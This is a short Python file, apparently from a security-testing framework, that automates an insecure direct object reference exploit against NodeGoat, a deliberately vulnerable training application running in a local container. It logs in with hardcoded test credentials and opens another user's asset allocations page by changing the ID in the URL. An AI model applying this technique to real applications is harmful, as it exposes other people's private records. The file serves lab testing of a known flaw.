from selenium.webdriver.common.by import By
from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
          "Name" : "Nodegoat_Insecure_DOR",
          "Description" : "",
          "Target" : "nodegoat",
          "Container" : "ubuntu-node-mongo",
          "Type" : ""
    }

    def runExploit(self):
		wrapper = self.wrapper
		wrapper.navigate("http://localhost:49160/login")
		wrapper.find("userName").keys("goat")
		wrapper.find("password").keys("123")
		wrapper.find("btn-default").click()
		
		wrapper.navigate("http://localhost:49160/allocations/3") 
		self.assertIn("Asset Allocations for Will Smith", wrapper.find("panel-heading").raw.text, "Exploit didn't work!")